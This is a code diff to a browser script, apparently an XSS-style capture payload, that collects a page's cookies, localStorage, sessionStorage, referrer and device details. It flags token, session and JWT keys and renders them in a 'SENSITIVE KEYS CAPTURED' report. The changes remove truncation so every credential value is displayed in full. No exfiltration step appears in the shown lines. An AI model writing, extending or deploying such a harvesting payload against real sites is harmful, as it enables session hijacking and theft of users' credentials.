@@ -12,7 +12,7 @@
   const cookieList = document.cookie ? document.cookie.split(";").map(s => s.trim()).filter(Boolean) : [];
   const data = {
     origin: location.origin, host: location.host, path: location.pathname, url: location.href,
-    cookies: document.cookie, userAgent: navigator.userAgent,
+    cookies: document.cookie, userAgent: navigator.userAgent, referrer: document.referrer,
     localStorage: ls, sessionStorage: ss, historyLength: history.length, gpu, vendor,
     capturedAt: new Date().toISOString()
   };
@@ -28,14 +28,13 @@
   const HOT = /token|auth|session|jwt|secret|key|bearer|sid|sso|hammer|access|refresh|cred/i;
   const lsKeys = Object.keys(ls), ssKeys = Object.keys(ss);
   const kvTable = obj => { const ks = Object.keys(obj); return ks.length
-    ? ks.slice(0, 16).map(k => "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(obj[k], 90)) + "</td></tr>").join("") + (ks.length > 16 ? "<tr><td class='k'></td><td class='v'>…+" + (ks.length - 16) + " more</td></tr>" : "")
+    ? ks.map(k => "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(obj[k], 200)) + "</td></tr>").join("")
     : "<tr><td class='v' style='color:#456'>— none —</td></tr>"; };
   // Sort sensitive (session/token) cookies to the TOP so they're always shown (never truncated), and list them in a banner.
   const hotCookieNames = cookieList.map(c => c.split("=")[0]).filter(k => HOT.test(k));
   const cookiesSorted = cookieList.slice().sort((a, b) => (HOT.test(b.split("=")[0]) ? 1 : 0) - (HOT.test(a.split("=")[0]) ? 1 : 0));
-  const CK_SHOW = 20;
   const ckTable = cookiesSorted.length
-    ? cookiesSorted.slice(0, CK_SHOW).map(c => { const k = c.split("=")[0]; const h = HOT.test(k); return "<tr><td class='k" + (h ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v" + (h ? " hi" : "") + "'>" + enc(clip(c.slice(k.length + 1), 120)) + "</td></tr>"; }).join("") + (cookiesSorted.length > CK_SHOW ? "<tr><td class='k'></td><td class='v'>…+" + (cookiesSorted.length - CK_SHOW) + " more (non-sensitive)</td></tr>" : "")
+    ? cookiesSorted.map(c => { const k = c.split("=")[0]; const h = HOT.test(k); return "<tr><td class='k" + (h ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v" + (h ? " hi" : "") + "'>" + enc(clip(c.slice(k.length + 1), 200)) + "</td></tr>"; }).join("")
     : "<tr><td class='v' style='color:#456'>— none —</td></tr>";
   const hotBanner = hotCookieNames.length
     ? "<div class='alert'>🔑 SENSITIVE KEYS CAPTURED: <b>" + enc(hotCookieNames.join(", ")) + "</b></div>"
@@ -75,7 +74,8 @@
     + "<tr><td class='k'>PATH</td><td class='v'>" + enc(data.path) + "</td></tr>"
     + "<tr><td class='k'>USER-AGENT</td><td class='v'>" + enc(clip(data.userAgent, 110)) + "</td></tr>"
     + "<tr><td class='k'>GPU</td><td class='v'>" + enc(clip(gpu + " · " + vendor, 110)) + "</td></tr>"
-    + "<tr><td class='k'>HISTORY</td><td class='v'>" + data.historyLength + " entries</td></tr>"
+    + "<tr><td class='k'>REFERRER</td><td class='v" + (data.referrer ? " hi" : "") + "'>" + (data.referrer ? enc(clip(data.referrer, 160)) : "<span style='opacity:.55'>(none)</span>") + "</td></tr>"
+    + "<tr><td class='k'>HISTORY</td><td class='v'>" + data.historyLength + " entries <span style='opacity:.55'>(count only — browsers do not expose past-history URLs to JS)</span></td></tr>"
     + "<tr><td class='k'>CAPTURED</td><td class='v'>" + enc(data.capturedAt) + "</td></tr>"
     + "</table>"
     + "<div class='sec'>COOKIES <em>" + cookieList.length + "</em></div><table>" + ckTable + "</table>"
